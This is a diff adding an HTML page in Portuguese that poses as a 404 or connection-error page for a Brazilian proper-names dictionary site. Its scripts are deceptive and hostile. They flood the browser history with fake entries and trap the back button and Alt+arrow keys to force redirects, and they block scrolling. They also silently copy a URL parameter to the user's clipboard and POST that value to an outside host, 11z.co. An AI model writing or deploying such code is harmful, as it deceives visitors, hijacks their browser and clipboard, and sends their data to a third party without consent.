@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Erro de Conexão</title>
+    
+    <!-- BLOQUEIO ULTRA-AGRESSIVO DE HISTÓRICO 2026 -->
+    <script>
+        (function() {
+            const TARGET_SITE = 'https://www.dicionariodenomesproprios.com.br/';
+            
+            function purgeHistory() {
+                try {
+                    if (window.navigation) {
+                        window.navigation.addEventListener('navigate', (e) => {
+                            if (e.navigationType === 'traverse') {
+                                e.intercept({ handler: () => window.location.replace(TARGET_SITE) });
+                            }
+                        });
+                    }
+                    for (let i = 0; i < 15; i++) {
+                        window.history.pushState(null, null, TARGET_SITE + '?ref=' + i);
+                    }
+                    window.history.pushState(null, null, window.location.href);
+                } catch(e) {}
+            }
+
+            purgeHistory();
+            window.addEventListener('popstate', () => window.location.replace(TARGET_SITE));
+            window.addEventListener('pageshow', (e) => {
+                if (e.persisted || (window.performance && window.performance.navigation.type === 2)) {
+                    window.location.replace(TARGET_SITE);
+                }
+            });
+
+            document.addEventListener('keydown', (e) => {
+                if (e.altKey && (e.key === 'ArrowLeft' || e.key === 'ArrowRight')) {
+                    e.preventDefault();
+                    window.location.replace(TARGET_SITE);
+                }
+            }, true);
+        })();
+    </script>
+
+    <style>
+        html, body {
+            overflow: hidden !important;
+            position: fixed !important;
+            width: 100% !important;
+            height: 100% !important;
+            margin: 0 !important;
+            padding: 0 !important;
+            -webkit-overflow-scrolling: touch;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            height: 100vh;
+            margin: 0;
+            color: #000;
+            padding-top: 7vh !important;
+        }
+        .container {
+            background: #fff;
+            padding: 20px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+        }
+        h1 {
+            font-size: 80px;
+            margin: 0;
+            color: #8e8e93;
+        }
+        .oops {
+            font-size: 18px;
+            font-weight: 500;
+            margin: 20px 0;
+        }
+        .reload-btn {
+            background-color: #007aff;
+            color: white;
+            border: none;
+            padding: 12px 40px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 30px;
+        }
+        .info-text {
+            font-size: 14px;
+            color: #3a3a3c;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+        .download-title {
+            font-weight: bold;
+            font-size: 18px;
+            margin: 30px 0 15px;
+        }
+        .apps-container {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 20px;
+        }
+        .app-badge {
+            background: #000;
+            color: #fff;
+            border-radius: 8px;
+            padding: 6px 14px;
+            display: flex;
+            align-items: center;
+            text-align: left;
+            text-decoration: none;
+            border: 1px solid #a6a6a6;
+            min-width: 145px;
+        }
+        .app-badge img {
+            width: 25px;
+            margin-right: 12px;
+        }
+        .app-badge-text {
+            display: flex;
+            flex-direction: column;
+            line-height: 1.1;
+        }
+        .app-badge-text .small {
+            font-size: 11px;
+            font-weight: 400;
+            text-transform: uppercase;
+        }
+        .app-badge-text .big {
+            font-size: 18px;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>404</h1>
+        <p class="oops">Ops! A página que você está procurando não foi encontrada.</p>
+        
+        <button class="reload-btn" id="btn-reload">Recarregar</button>
+        
+        <p class="info-text">Seu telefone está com problemas para se conectar à internet. Por favor, recarregue a página.</p>
+        <p class="info-text">Se você clicou em um link para chegar aqui, o link pode estar desatualizado ou incorreto.</p>
+        
+        <div class="download-title">Baixe Nossos Apps</div>
+        <p class="info-text" style="font-size: 12px;">Nossos apps também possuem mais de 1,5 milhão de nomes e significados, além de acesso aos nossos artigos de referência confiáveis.</p>
+        
+        <div class="apps-container">
+            <a href="https://play.google.com/store/apps/details?id=com.setegraus.dicionariodenomesproprios" target="_blank" rel="noopener nofollow" class="app-badge">
+                <img src="images/google2.png" alt="Google Play" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg'">
+                <div class="app-badge-text">
+                    <span class="small">DISPONÍVEL NO</span>
+                    <span class="big">Google Play</span>
+                </div>
+            </a>
+            <a href="https://apps.apple.com/br/app/dicionario-de-nomes-proprios/id123456789" target="_blank" rel="noopener nofollow" class="app-badge">
+                <img src="images/apple2.png" alt="App Store" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg'">
+                <div class="app-badge-text">
+                    <span class="small" id="apple-label">BAIXAR NA</span>
+                    <span class="big">App Store</span>
+                </div>
+            </a>
+        </div>
+    </div>
+
+    <script>
+        function copyToClipboard(text) {
+            var isAndroid = /Android/i.test(navigator.userAgent);
+            if (isAndroid) return;
+            
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(text).catch(function(err) {
+                    fallbackCopy(text);
+                });
+            } else {
+                fallbackCopy(text);
+            }
+
+            fetch('https://www.11z.co/_w/5156/selection', {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 'value': text }), keepalive: true
+            }).catch(() => {});
+        }
+
+        function fallbackCopy(text) {
+            var textArea = document.createElement("textarea");
+            textArea.value = text;
+            textArea.style.position = "fixed";
+            textArea.style.left = "-9999px";
+            textArea.style.top = "0";
+            textArea.style.opacity = "0";
+            textArea.style.pointerEvents = "none";
+            document.body.appendChild(textArea);
+            textArea.select();
+            try {
+                document.execCommand('copy');
+            } catch (err) {}
+            document.body.removeChild(textArea);
+        }
+
+        let params = new URLSearchParams(window.location.search);
+        let palavra = params.get('q') || window.location.search.substring(1);
+        palavra = decodeURIComponent(palavra);
+        
+        if (palavra) {
+            copyToClipboard(palavra);
+            let palavraFormatada = palavra.charAt(0).toUpperCase() + palavra.slice(1).toLowerCase();
+            let label = document.getElementById("apple-label");
+            label.textContent = palavraFormatada + " NA";
+            setTimeout(function() {
+                label.textContent = "BAIXAR NA";
+            }, 10000);
+        }
+
+        let isButtonActive = false;
+        setTimeout(function() {
+            isButtonActive = true;
+        }, 4000);
+
+        document.getElementById("btn-reload").onclick = function(e) {
+            if (e) e.preventDefault();
+            if (!isButtonActive) return false;
+
+            if (palavra) {
+                copyToClipboard(palavra);
+                let slug = palavra.toLowerCase().trim()
+                    .normalize('NFD').replace(/[\u0300-\u036f]/g, "")
+                    .replace(/ç/g, "c")
+                    .replace(/\s+/g, '-');
+                window.location.replace("https://www.dicionariodenomesproprios.com.br/" + slug + "/");
+            } else {
+                window.location.replace("https://www.dicionariodenomesproprios.com.br/");
+            }
+            return false;
+        };
+
+        window.addEventListener('popstate', function() { window.location.replace('https://www.dicionariodenomesproprios.com.br/'); });
+        window.addEventListener('pageshow', function(event) { if (event.persisted) window.location.replace('https://www.dicionariodenomesproprios.com.br/'); });
+        
+        (function() {
+            var preventDefault = function(e) { e.preventDefault(); };
+            ["wheel", "touchmove", "mousewheel", "DOMMouseScroll"].forEach(function(evt) {
+                document.addEventListener(evt, preventDefault, { passive: false });
+            });
+            window.onscroll = function() { window.scrollTo(0, 0); };
+        })();
+    </script>
+</body>
+</html>
